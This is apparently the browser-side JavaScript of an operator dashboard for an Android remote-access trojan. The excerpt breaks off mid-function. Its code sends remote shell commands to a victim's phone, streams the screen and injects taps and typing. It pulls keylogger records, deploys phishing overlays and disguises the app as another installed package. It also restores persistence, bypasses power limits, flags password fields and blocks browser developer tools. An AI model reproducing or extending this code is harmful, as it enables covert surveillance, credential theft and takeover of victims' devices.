console.clear();
console.log("%c[SYSTEM LOG] %cInitializing encrypted session...", "color:#00f2ff; font-weight:bold;", "color:#888;");
console.log("%c[SECURITY] %cSandbox environment detected. Applying hardened telemetry protocols.", "color:#39ff14; font-weight:bold;", "color:#888;");
console.log("%c[NETWORK] %cProxy link established: 127.0.0.1:9191 -> 0.0.0.0:443", "color:#ffff00; font-weight:bold;", "color:#888;");

// Security Event Listeners
document.addEventListener("contextmenu", e => e.preventDefault());
document.addEventListener("keydown", e => {
  if (123 === e.keyCode || (e.ctrlKey && e.shiftKey && (73 === e.keyCode || 74 === e.keyCode || 67 === e.keyCode)) || (e.ctrlKey && 85 === e.keyCode)) {
    return e.preventDefault(), false;
  }
});

// Global Variables & State
const mask = e => "0x_" + btoa(e.split("").reverse().join(""));
let _0x1a = 0;
let _0x1b = [];
let _0x1c = -1;
let _0x2a = false;
let _0x2b = false;
let _0x2c = null;
let _0x2d = 0;
let _0x3a = false;
let _0x3b = 0;
let _0x3c = "0";
let _0x3d = 640;
let _0x3e = 480;
let _0x3f = 40;
let _lv = null;
let _ac = false;
let audioStream = null;
let _ih = null;

// Session Stability & Render Proxy Fetch Wrapper
const originalFetch = window.fetch;
window.fetch = async function(resource, init) {
  let url = resource;
  if (typeof url === 'string' && url.startsWith('/') && !url.startsWith('/proxy') && !url.startsWith('/c2/')) {
    const urlParams = new URLSearchParams(window.location.search);
    const deviceId = urlParams.get('deviceId');
    if (deviceId) {
      const sep = url.includes('?') ? '&' : '?';
      url = `/proxy${url}${sep}deviceId=${deviceId}`;
    }
  }
  try {
    const response = await originalFetch(url, init);
    if (response.status === 401) {
      showToast("SESSION_EXPIRED: Re-authenticating...", "error");
      setTimeout(() => {
        window.location.reload();
      }, 1000);
    }
    return response;
  } catch (error) {
    throw error;
  }
};

// Render Proxy Link Interceptor
if (window.location.pathname.startsWith('/proxy')) {
  const urlParams = new URLSearchParams(window.location.search);
  const deviceId = urlParams.get('deviceId');
  if (deviceId) {
    document.addEventListener('click', function(e) {
      const anchor = e.target.closest('a');
      if (anchor && anchor.getAttribute('href') && anchor.getAttribute('href').startsWith('/')) {
        const href = anchor.getAttribute('href');
        if (!href.startsWith('/proxy') && !href.startsWith('/c2/')) {
          e.preventDefault();
          const sep = href.includes('?') ? '&' : '?';
          window.location.href = `/proxy${href}${sep}deviceId=${deviceId}`;
        }
      }
    });
  }
}

// UI Info Popup
function showInfo(e, t, o) {
  if (e) e.stopPropagation();
  let n = document.getElementById("info-popup");
  if (!n) {
    n = document.createElement("div");
    n.id = "info-popup";
    Object.assign(n.style, {
      position: "fixed",
      background: "rgba(8, 12, 18, 0.98)",
      border: "1px solid var(--neon-cyan)",
      color: "#fff",
      padding: "16px",
      borderRadius: "12px",
      zIndex: "20000",
      width: "300px",
      boxShadow: "0 20px 60px rgba(0,0,0,0.95), 0 0 25px rgba(0,242,255,0.2)",
      transition: "opacity 0.25s ease",
      opacity: "0",
      display: "none",
      pointerEvents: "auto"
    });
    document.body.appendChild(n);
  }

  const triggerBtn = e ? (e.currentTarget || e.target) : null;
  let titleColor = "var(--neon-cyan)";
  if (triggerBtn) {
    const parentLabel = triggerBtn.closest(".info-label");
    if (parentLabel && parentLabel.style.color) {
      titleColor = parentLabel.style.color;
    } else {
      const parentCard = triggerBtn.closest("h2, .card, .info-item, .info-section");
      if (parentCard) {
        const h2El = parentCard.tagName.toLowerCase() === "h2" ? parentCard : parentCard.querySelector("h2, .info-label");
        if (h2El && h2El.style.color) {
          titleColor = h2El.style.color;
        } else if (h2El) {
          const computedColor = window.getComputedStyle(h2El).color;
          if (computedColor && computedColor !== "rgba(0, 0, 0, 0)") {
            titleColor = computedColor;
          }
        }
      }
    }
  }

  const rect = triggerBtn ? triggerBtn.getBoundingClientRect() : { top: 100, left: 100, bottom: 120, width: 20 };
  let topPos = rect.bottom + 8;
  let leftPos = rect.left + (rect.width / 2) - 150;

  if (topPos + 160 > window.innerHeight) {
    topPos = rect.top - 150;
  }
  if (topPos < 10) topPos = 10;

  if (leftPos < 10) leftPos = 10;
  if (leftPos + 300 > window.innerWidth - 10) {
    leftPos = window.innerWidth - 310;
  }

  n.style.top = topPos + "px";
  n.style.left = leftPos + "px";
  n.style.borderColor = titleColor;
  n.innerHTML = `<div style="font-weight:bold; color:${titleColor}; font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px; text-shadow:0 0 10px ${titleColor};">${t}</div><div style="font-size:0.72rem; opacity:0.9; font-family:'JetBrains Mono', monospace; line-height:1.5;">${o}</div>`;
  n.style.display = "block";
  setTimeout(() => n.style.opacity = "1", 10);
}

function hideInfo() {
  const e = document.getElementById("info-popup");
  if (e && "block" === e.style.display) {
    e.style.opacity = "0";
    setTimeout(() => e.style.display = "none", 300);
  }
}

function updateNav() {
  const rawPath = window.location.pathname;
  let n = rawPath.replace(/^\/proxy/, "") || "/";
  if (!n.startsWith("/")) n = "/" + n;

  const e = document.querySelectorAll(".nav a");
  e.forEach(item => {
    const t = item.getAttribute("href");
    let o = false;
    if ("/" === t || "/terminal" === t) {
      o = ("/" === n || "/terminal" === n);
    } else if ("/files" === t) {
      o = (n.startsWith("/files") || n.startsWith("/device/apps"));
    } else if ("/device" === t) {
      o = (n.startsWith("/device") && !n.includes("/apps"));
    } else {
      o = (t && t !== "/" && n.startsWith(t));
    }

    if (o) {
      item.classList.add("active");
    } else {
      item.classList.remove("active");
    }
  });
}

function showToast(e, t = "info") {
  let o = document.getElementById("c2-toast");
  if (!o) {
    o = document.createElement("div");
    o.id = "c2-toast";
    Object.assign(o.style, {
      position: "fixed",
      bottom: "15%",
      left: "50%",
      transform: "translateX(-50%)",
      background: "rgba(15,15,25,0.98)",
      border: "1px solid var(--neon-cyan)",
      color: "#fff",
      padding: "16px 32px",
      borderRadius: "12px",
      zIndex: "10000",
      fontSize: "0.9rem",
      textAlign: "center",
      minWidth: "320px",
      boxShadow: "0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",
      transition: "all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)",
      opacity: "0",
      display: "none",
      fontFamily: "Orbitron, sans-serif",
      letterSpacing: "1px"
    });
    document.body.appendChild(o);
  }
  o.style.borderColor = "error" === t ? "var(--danger)" : "var(--neon-cyan)";
  o.innerHTML = e;
  o.style.display = "block";
  setTimeout(() => {
    o.style.opacity = "1";
    o.style.bottom = "20%";
  }, 10);
  setTimeout(() => {
    o.style.opacity = "0";
    o.style.bottom = "15%";
    setTimeout(() => o.style.display = "none", 300);
  }, 3800);
}

// Repair & Optimization Functions
function repairProtocol() {
  _0x4a("REPAIR_LINK", "Re-synchronizing background telemetry protocols...", () => {
    fetch("/gps/request-permission");
    fetch("/device/fix-persistence")
      .then(e => e.json())
      .then(e => { showToast(e.message); })
      .catch(e => {
        console.error(e);
        showToast("Connection failure", "error");
      });
  });
}

function deployStealthMasquerade() {
  const sel = document.getElementById("stealth-app-select");
  if (!sel || !sel.value) {
    showToast("SELECT_AN_INSTALLED_APP", "error");
    return;
  }
  const pkg = sel.value;
  showToast("DEPLOYING_STEALTH_CAMOUFLAGE...");
  fetch("/device/masquerade?pkg=" + encodeURIComponent(pkg))
    .then(r => {
      showToast("STEALTH_CAMOUFLAGE_DEPLOYED");
      setTimeout(() => location.reload(), 1500);
    })
    .catch(err => showToast("CAMOUFLAGE_ERROR", "error"));
}

function dispatchPermissionSequence() {
  showToast("PERMISSION_PROMPTS_SENT");
  fetch("/device/request-permissions")
    .then(e => e.json())
    .then(e => { showToast(e.message); })
    .catch(e => {
      console.error(e);
      showToast("Request failed", "error");
    });
}

function optimizeStability() {
  _0x4a("STABILITY_OPTIMIZE", "Bypassing OEM power restrictions...", () => {
    fetch("/device/optimize-stability")
      .then(e => e.json())
      .then(e => { showToast("STABILITY_SYNC: Follow OEM instructions to enable Auto-start"); })
      .catch(e => {
        console.error(e);
        showToast("Stability sync failed", "error");
      });
  });
}

function deepRepair() {
  _0x4a("CORE_REPAIR", "Opening deep system configuration to resolve environment conflicts...", () => {
    fetch("/device/deep-repair")
      .then(e => e.json())
      .then(e => { showToast("SETTINGS_OPENED: Complete repair on device"); })
      .catch(e => {
        console.error(e);
        showToast("Repair link failed", "error");
      });
  });
}

function injectTrust() {
  showToast("BYPASS_SEQUENCE_INITIATED");
  fetch("/device/inject-trust")
    .then(e => e.json())
    .then(e => { showToast("BYPASS_INITIATED: Wait for install prompt"); })
    .catch(e => {
      console.error(e);
      showToast("Bypass failed", "error");
    });
}

function initiateHeal() {
  _0x4a("AUTO_HEAL_PROTOCOL", "Initiating self-healing sequence to restore persistence layers...", () => {
    ghostAction("autoheal");
  });
}

// Tactical Modal Helper
function _0x4a(e, t, o) {
  let n = document.getElementById("tactical-modal");
  if (!n) {
    n = document.createElement("div");
    n.id = "tactical-modal";
    Object.assign(n.style, {
      position: "fixed",
      top: "0",
      left: "0",
      width: "100%",
      height: "100%",
      background: "rgba(0,0,0,0.85)",
      zIndex: "30000",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      opacity: "0",
      transition: "opacity 0.4s ease",
      backdropFilter: "blur(10px)"
    });
    n.innerHTML = '<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button></div></div>';
    document.body.appendChild(n);
  }

  document.getElementById("tm-title").innerText = e;
  document.getElementById("tm-msg").innerText = t;
  document.getElementById("tm-progress").style.width = "0%";
  n.style.display = "flex";
  setTimeout(() => n.style.opacity = "1", 10);

  let aborted = false;
  const abortSequence = () => {
    aborted = true;
    n.style.opacity = "0";
    setTimeout(() => n.style.display = "none", 400);
  };

  document.getElementById("tm-cancel").onclick = abortSequence;
  let progressVal = 0;
  const progressInterval = setInterval(() => {
    if (aborted) {
      clearInterval(progressInterval);
    } else {
      progressVal += 6.5 * Math.random();
      if (progressVal >= 100) {
        progressVal = 100;
        clearInterval(progressInterval);
        setTimeout(() => {
          if (!aborted) {
            abortSequence();
            o();
          }
        }, 400);
      }
      document.getElementById("tm-progress").style.width = progressVal + "%";
    }
  }, 80);
}

// Authentication & Password Settings
async function handleLogin(e) {
  e.preventDefault();
  const t = document.getElementById("password").value;
  const o = document.getElementById("status-header");
  const n = document.getElementById("uplink-btn");
  n.disabled = true;
  n.style.opacity = "0.5";
  try {
    let loginEndpoint = "./login";
    const res = await fetch(loginEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "password=" + encodeURIComponent(mask(t)) + "&json=true"
    });
    const data = await res.json();
    if (data.success) {
      o.textContent = "ACCESS_GRANTED";
      o.style.color = "#39ff14";
      o.style.textShadow = "0 0 25px #39ff14";
      setTimeout(() => {
        window.location.reload();
      }, 800);
    } else {
      o.textContent = "INCORRECT_PASSWORD";
      o.style.color = "#ff3131";
      o.style.textShadow = "0 0 25px #ff3131";
      n.disabled = false;
      n.style.opacity = "1";
      setTimeout(() => {
        o.textContent = "RESTRICTED_ACCESS";
        o.style.color = "#00f2ff";
        o.style.textShadow = "0 0 15px rgba(0,242,255,0.6)";
      }, 2000);
    }
  } catch (err) {
    console.error(err);
    n.disabled = false;
    n.style.opacity = "1";
  }
}

async function updatePassword(e) {
  e.preventDefault();
  const inputEl = e.target.querySelector('input[name="new_password"]');
  if (!inputEl) return;
  const t = inputEl.value;
  if (!t || !t.trim()) {
    showToast("Password cannot be empty", "error");
    return;
  }
  try {
    const res = await fetch("/settings/password", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "new_password=" + encodeURIComponent(mask(t.trim()))
    });
    const text = await res.text();
    document.open();
    document.write(text);
    document.close();
  } catch (err) {
    console.error(err);
  }
}

// Logs View
function fetchLogs() {
  const n = document.getElementById("log-terminal");
  if (!n) return;
  fetch("/terminal/logs?since=" + _0x1a)
    .then(e => e.json())
    .then(e => {
      if (e.reset) {
        n.innerHTML = "";
        _0x1a = 0;
      }
      if (e.logs && e.logs.length > 0) {
        const autoScroll = n.scrollHeight - n.scrollTop <= n.clientHeight + 50;
        if (_0x1a === 0) n.innerHTML = "";
        e.logs.forEach(logLine => {
          const div = document.createElement("div");
          div.style.marginBottom = "4px";
          let cleanText = logLine;
          if (logLine.startsWith("[I]")) {
            div.style.color = "var(--encrypted-blue)";
            div.style.fontWeight = "bold";
            div.style.textShadow = "0 0 10px rgba(0, 136, 255, 0.3)";
            cleanText = logLine.substring(3);
          } else if (logLine.startsWith("[C]")) {
            div.style.color = "var(--danger)";
            div.style.textShadow = "0 0 10px rgba(255, 49, 49, 0.5)";
            div.style.fontWeight = "bold";
            cleanText = logLine.substring(3);
          } else if (logLine.startsWith("[W]")) {
            div.style.color = "var(--neon-orange)";
            cleanText = logLine.substring(3);
          } else if (logLine.startsWith("[S]")) {
            div.style.color = "var(--neon-green)";
            cleanText = logLine.substring(3);
          } else {
            div.style.color = "var(--neon-cyan)";
          }
          div.innerText = cleanText;
          n.appendChild(div);
        });
        _0x1a = e.last_id;
        if (autoScroll) {
          n.scrollTop = n.scrollHeight;
        }
      }
    })
    .catch(e => console.error("Log fetch failed", e));
}

function clearSessionLogs() {
  showToast("PURGING_ACTIVITY_LOGS...");
  fetch("/terminal/clear-logs").then(() => {
    _0x1a = 0;
    fetchLogs();
  });
}

// Device Commands & Hub Openers
function openAccessibility() {
  fetch("/device/open-accessibility")
    .then(e => e.json())
    .then(e => { showToast("ACCESSIBILITY_HUB_OPENED"); })
    .catch(e => {
      console.error(e);
      showToast("Link failure", "error");
    });
}

function openNotifications() {
  fetch("/device/open-notifications")
    .then(e => e.json())
    .then(e => { showToast("NOTIFICATION_HUB_OPENED"); })
    .catch(e => {
      console.error(e);
      showToast("Link failure", "error");
    });
}

function deviceCmd(e) {
  fetch("/device/" + e)
    .then(e => e.json())
    .then(e => {
      if (e && e.redirect) window.location.href = e.redirect;
    });
}

function restartServer() {
  if (confirm("Refresh background service? Interface will temporarily disconnect.")) {
    fetch("/terminal/restart");
    setTimeout(() => location.reload(), 2500);
  }
}

function selfDestruct() {
  if (confirm("CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?")) {
    fetch("/device/self-destruct");
  }
}

function sendToast() {
  const e = document.getElementById("toast-msg").value;
  if (e) fetch("/device/toast?msg=" + encodeURIComponent(e));
}

function toggleColorPicker(e) {
  if (e) e.stopPropagation();
  const palette = document.getElementById("color-picker-palette");
  if (palette) {
    palette.style.display = "none" === palette.style.display ? "grid" : "none";
  }
}

function pickToastColor(e) {
  document.getElementById("toast-color-val").value = e;
  document.getElementById("toast-color-btn").style.background = e;
  const palette = document.getElementById("color-picker-palette");
  if (palette) palette.style.display = "none";
}

function sendEnhancedToast() {
  const a = document.getElementById("toast-msg").value;
  if (!a) return showToast("ENTER_MESSAGE_FIRST", "error");
  const e = document.getElementById("toast-anim").value;
  if ("burnt" === e) {
    showToast("Sending_Burnt_Toast");
    for (let i = 0; i < 15; i++) {
      setTimeout(() => {
        const size = Math.floor(40 * Math.random()) + 15;
        const y = Math.floor(1600 * Math.random()) + 100;
        const dur = Math.floor(7000 * Math.random()) + 3000;
        const anim = ["pop", "static", "scroll"][Math.floor(3 * Math.random())];
        const color = document.getElementById("toast-color-val").value;
        fetch("/device/toast?msg=" + encodeURIComponent(a) + "&size=" + size + "&y=" + y + "&duration=" + dur + "&anim=" + anim + "&color=" + encodeURIComponent(color));
      }, 200 * i);
    }
  } else {
    const size = document.getElementById("toast-size").value;
    const y = document.getElementById("toast-y").value;
    const dur = document.getElementById("toast-dur").value;
    const color = document.getElementById("toast-color-val").value;
    fetch("/device/toast?msg=" + encodeURIComponent(a) + "&size=" + size + "&y=" + y + "&duration=" + dur + "&anim=" + e + "&color=" + encodeURIComponent(color))
      .then(res => res.json())
      .then(data => {
        if (data.success) showToast("TOAST_DISPATCHED");
      });
  }
}

function openApp() {
  const e = document.getElementById("app-selector").value;
  if (e) fetch("/device/open-app?pkg=" + encodeURIComponent(e));
}

function openUrl() {
  const e = document.getElementById("target-url").value;
  if (e) fetch("/device/open-url?url=" + encodeURIComponent(e));
}

function executeShell() {
  const e = document.getElementById("shell-cmd");
  const t = e.value;
  const o = document.getElementById("shell-output");
  if (t) {
    _0x1b.push(t);
    if (_0x1b.length > 50) _0x1b.shift();
    _0x1c = -1;
    const div = document.createElement("div");
    div.style.color = "#fff";
    div.style.marginTop = "10px";
    const promptElement = document.getElementById("terminal-prompt");
    const promptText = promptElement ? promptElement.innerText : "root@Android:~#";
    div.innerHTML = '<span style="color:var(--terminal-green)">' + promptText + "</span> " + t;
    o.appendChild(div);
    e.value = "";
    fetch("/device/shell?cmd=" + encodeURIComponent(t))
      .then(res => res.json())
      .then(data => {
        const tu = document.getElementById("termux-uplink");
        const symbol = data.termux_available ? "$" : "#";
        const currentPath = data.current_path || "/sdcard";

        if (data.termux_available) {
          if (tu) tu.style.display = "block";
        } else {
          if (tu) tu.style.display = "none";
        }

        if (t.trim().toLowerCase() === "exit") {
          window.isKaliMode = false;
        } else if (t.startsWith("nh") || t.startsWith("nethunter") || t.startsWith("kali") || t.startsWith("nmap") || t.startsWith("msfconsole") || t.startsWith("sqlmap") || t.startsWith("hydra") || t.startsWith("wifite") || t.startsWith("aircrack-ng")) {
          window.isKaliMode = true;
        }
        const userPrefix = window.isKaliMode ? "kali@android" : "root@Android";
        const p = document.getElementById("terminal-prompt");
        if (p) {
          p.style.color = window.isKaliMode ? "var(--neon-cyan)" : "var(--terminal-green)";
          p.innerText = userPrefix + ":" + currentPath + symbol;
        }

        if (data.output === "__CLEAR_SCREEN__") {
          if (o) o.innerHTML = "";
          return;
        }
        if (o) {
          const outDiv = document.createElement("div");
          outDiv.style.whiteSpace = "pre-wrap";
          const rawText = data.output || "No output";
          outDiv.innerHTML = rawText.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
          o.appendChild(outDiv);
          o.scrollTop = o.scrollHeight;
        }
      })
      .catch(() => {
        if (o) {
          const errDiv = document.createElement("div");
          errDiv.style.color = "var(--danger)";
          errDiv.textContent = "[ERROR] Connection lost";
          o.appendChild(errDiv);
        }
      });
  }
}

// Ghost Screen Controls
function startGhostScreen() {
  _0x2a = true;
  const statusCard = document.getElementById("ghost-screen-status");
  if (statusCard) statusCard.style.display = "none";
  const btn = document.getElementById("ghost-toggle-btn");
  if (btn) {
    btn.innerText = "TERMINATE";
    btn.style.borderColor = "var(--danger)";
    btn.style.color = "var(--danger)";
  }
  refreshGhostScreen();
}

function stopGhostScreen() {
  _0x2a = false;
  const statusCard = document.getElementById("ghost-screen-status");
  if (statusCard) {
    statusCard.style.display = "block";
    statusCard.innerText = "OLED_STANDBY";
  }
  const btn = document.getElementById("ghost-toggle-btn");
  if (btn) {
    btn.innerText = "INITIATE_VIEW";
    btn.style.borderColor = "var(--neon-green)";
    btn.style.color = "var(--neon-green)";
  }
  document.getElementById("ghost-screen-stream").src = "";
}

function toggleGhostScreen() {
  if (_0x2a) {
    stopGhostScreen();
  } else {
    startGhostScreen();
  }
}

function refreshGhostScreen() {
  if (_0x2a) {
    const streamImg = document.getElementById("ghost-screen-stream");
    const statusCard = document.getElementById("ghost-screen-status");
    const img = new Image();
    img.src = "/ghost/screenshot?t=" + Date.now();
    img.onload = () => {
      if (_0x2a) {
        streamImg.src = img.src;
        if (statusCard) statusCard.style.display = "none";
        setTimeout(refreshGhostScreen, _0x2b ? 5000 : 200);
      }
    };
    img.onerror = () => {
      if (_0x2a) setTimeout(refreshGhostScreen, 300);
    };
  }
}

function startGhostDrag(e) {
  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
  _0x2c = {
    x: (e.clientX - rect.left) / rect.width * 100,
    y: (e.clientY - rect.top) / rect.height * 100,
    t: Date.now()
  };
}

function endGhostDrag(e) {
  if (!_0x2c) return;
  const now = Date.now();
  if (now - _0x2d < 150) return;
  _0x2d = now;
  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
  const currentX = (e.clientX - rect.left) / rect.width * 100;
  const currentY = (e.clientY - rect.top) / rect.height * 100;
  const dragDuration = now - _0x2c.t;

  if (Math.sqrt(Math.pow(currentX - _0x2c.x, 2) + Math.pow(currentY - _0x2c.y, 2)) < 2) {
    fetch("/ghost/interact?action=click&px=" + _0x2c.x + "&py=" + _0x2c.y);
  } else {
    fetch("/ghost/interact?action=swipe&px1=" + _0x2c.x + "&py1=" + _0x2c.y + "&px2=" + currentX + "&py2=" + currentY + "&d=" + Math.max(dragDuration, 100));
  }
  _0x2c = null;
}

function openSettings() {
  fetch("/ghost/interact?action=settings");
}

function deployOverlay() {
  const e = document.getElementById("overlay-type").value;
  if (!e) return showToast("SELECT_TARGET_FIRST", "error");
  showToast("OVERLAY_DISPATCH_SENT");
  fetch("/ghost/deploy-overlay?type=" + e)
    .then(res => res.json())
    .then(() => { showToast("OVERLAY_DEPLOYED"); });
}

function terminateOverlay() {
  fetch("/ghost/deploy-overlay")
    .then(res => res.json())
    .then(() => { showToast("OVERLAY_TERMINATED"); });
}

function toggleLock() {
  fetch("/ghost/lock").then(() => {
    showToast("Uplink command sent: SYSTEM_LOCK");
    checkGhostStatus();
  });
}

function toggleBlackout() {
  const isActivating = document.getElementById("blackout-btn").innerText.includes("ACTIVATE");
  showToast(isActivating ? "BLACKOUT_PROTOCOL_ENGAGED" : "RESTORING_HARDWARE_BACKLIGHT...");
  fetch("/ghost/interact?action=" + (isActivating ? "blackout_on" : "blackout_off")).then(() => checkGhostStatus());
}

function toggleAutoPilot() {
  fetch("/stealth?action=autopilot")
    .then(res => res.json())
    .then(data => {
      const btn = document.getElementById("autopilot-btn");
      if (data.autopilot) {
        btn.innerText = "AUTOPILOT_ENGAGED";
        btn.classList.add("btn-engaged-yellow");
        btn.style.color = "#000";
        btn.style.background = "#ffff00";
      } else {
        btn.innerText = "AUTOPILOT_OFF";
        btn.classList.remove("btn-engaged-yellow");
        btn.style.color = "var(--neon-yellow)";
        btn.style.background = "rgba(255, 255, 255, 0.03)";
      }
    });
}

function ghostType() {
  const e = document.getElementById("ghost-type-input");
  const t = e.value;
  if (t) fetch("/ghost/interact?action=type&text=" + encodeURIComponent(t));
  e.value = "";
}

// Base Actions
function ghostAction(e) {
  fetch("/ghost/interact?action=" + e);
}

function clearGhostLogs() {
  showToast("PURGING_KEYLOG_HISTORY...");
  fetch("/ghost/clear").then(() => refreshGhostLogs());
}

// Tree Traversal Inspector
async function refreshInspector() {
  const o = document.getElementById("inspector-tree");
  if (!o) return;
  o.innerHTML = '<span style="color:var(--neon-cyan)">[SCANNING] Traversing Accessibility Tree...</span>';
  try {
    const data = await (await fetch("/ghost/inspector")).json();
    if (data.error) {
      o.innerHTML = '<span style="color:var(--danger)">[ERROR] ' + data.error + "</span>";
    } else {
      o.innerHTML = "";
      const div = document.createElement("div");
      div.style.padding = "12px 18px";
      div.style.marginBottom = "20px";
      div.style.background = "rgba(0, 242, 255, 0.08)";
      div.style.border = "1px solid rgba(0, 242, 255, 0.15)";
      div.style.borderRadius = "10px";
      div.style.boxShadow = "inset 0 0 15px rgba(0,242,255,0.05)";

      let pkgName = data.package;
      let iconHtml = "&#128241;";
      if (["launcher", "trebuchet", "home", "desktop", "nexuslauncher"].some(kw => pkgName.toLowerCase().includes(kw))) {
        pkgName = "System Home Screen";
        iconHtml = "&#127968;";
      } else if (pkgName.includes(".android.settings")) {
        pkgName = "System Settings";
      } else if (pkgName.includes(".vending")) {
        pkgName = "Google Play Store";
      } else if (pkgName.includes(".chrome")) {
        pkgName = "Chrome Browser";
      } else if (pkgName.includes(".messaging") || pkgName.includes(".sms")) {
        pkgName = "SMS / Messages";
      } else if (pkgName.includes(".contacts")) {
        pkgName = "Contacts / Phonebook";
      }

      div.innerHTML = `<div style="display:flex; align-items:center; gap:12px; width:100%;"><div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${iconHtml}</div><div style="flex-grow:1; min-width:0; overflow:hidden;"><div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">CURRENT_UPLINK_CONTEXT</div><div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${pkgName}</div><div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${data.package}</div></div><div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">SECURE_LAYER_V2<br>SYSCALL_ACTIVE</div></div>`;
      o.appendChild(div);
      _0x5a(data.tree, o, 0, data.width, data.height);
    }
  } catch (err) {
    o.innerHTML = '<span style="color:var(--danger)">[FATAL] Inspector Timeout</span>';
  }
}

function _0x5a(n, r, a, l, s) {
  if (!n) return;
  const e = document.createElement("div");
  e.style.display = "flex";
  e.style.alignItems = "center";
  e.style.padding = "8px 12px";
  e.style.marginLeft = 16 * a + "px";
  e.style.borderLeft = "1px solid rgba(0, 242, 255, 0.12)";
  e.style.whiteSpace = "nowrap";
  e.style.transition = "all 0.2s cubic-bezier(0.4, 0, 0.2, 1)";
  e.style.cursor = "pointer";
  e.style.borderRadius = "4px";

  const shortClass = n.class.split(".").pop();
  let bulletIcon = "&#9634;";
  if (n.class.toLowerCase().includes("button")) bulletIcon = "&#9007;";
  else if (n.class.toLowerCase().includes("edit")) bulletIcon = "&#9998;";
  else if (n.class.toLowerCase().includes("text")) bulletIcon = "&#8443;";
  else if (n.class.toLowerCase().includes("image")) bulletIcon = "&#128443;";
  else if (n.class.toLowerCase().includes("layout")) bulletIcon = "&#128392;";
  else if (n.class.toLowerCase().includes("recycler") || n.class.toLowerCase().includes("list")) bulletIcon = "&#128220;";

  e.title = `Class: ${n.class}\nBounds: ${n.x},${n.y} [${n.w}x${n.h}]\nVisible: ${n.visible}\nFocusable: ${n.focusable}`;
  let innerMarkup = `<span style="color:var(--neon-cyan); margin-right:10px; font-size:0.9rem; opacity:0.8;">${bulletIcon}</span><span style="color:var(--neon-green); font-weight:900; font-size:0.85rem; letter-spacing:0.5px;">${shortClass}</span>`;

  if (n.resId) {
    innerMarkup += `<span style="color:var(--neon-orange); margin-left:10px; font-size:0.7rem; opacity:0.8; font-family:monospace;">#${n.resId.split("/").pop()}</span>`;
  }
  if (n.text) {
    innerMarkup += `<span style="color:#fff; margin-left:12px; font-weight:bold; font-size:0.8rem; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">"${n.text}"</span>`;
  } else if (n.desc) {
    innerMarkup += `<span style="color:rgba(255,255,255,0.5); margin-left:12px; font-size:0.75rem; font-style:italic;">[${n.desc}]</span>`;
  }
  if (n.clickable) {
    innerMarkup += '<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">CLICKABLE</span>';
  }
  if (n.password) {
    innerMarkup += '<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">PASSWORD</span>';
  }
  if (n.editable) {
    innerMarkup += '<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">EDITABLE</span>';
  }

  e.innerHTML = innerMarkup;
  e.onmouseenter = () => {
    e.style.background = "rgba(0, 242, 255, 0.08)";
    e.style.boxShadow = "0 0 10px rgba(0, 242, 255, 0.1)";
  };
  e.onmouseleave = () => {
    e.style.background = "transparent";
    e.style.boxShadow = "none";
  };
  e.onclick = event => {
    event.stopPropagation();
    const targetX = 100 * (n.x + n.w / 2) / l;
    const targetY = 100 * (n.y + n.h / 2) / s;
    fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
  };

  r.appendChild(e);
  if (n.children) {
    n.children.forEach(c => _0x5a(c, r, a + 1, l, s));
  }
}

// Keylogger Terminal Logs
async function refreshGhostLogs() {
  try {
    const res = await fetch("/ghost/keys");
    if (res.ok) {
      const data = await res.json();
      const n = document.getElementById("ghost-terminal");
      if (n && data.keys.length > 0) {
        const autoScroll = n.scrollHeight - n.scrollTop <= n.clientHeight + 10;
        let formattedText = data.keys.join("").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        formattedText = formattedText.replace(/(\[.*?\] ->)/g, '<span style="color:var(--neon-cyan); font-weight:bold; opacity:0.8;">$1</span>');
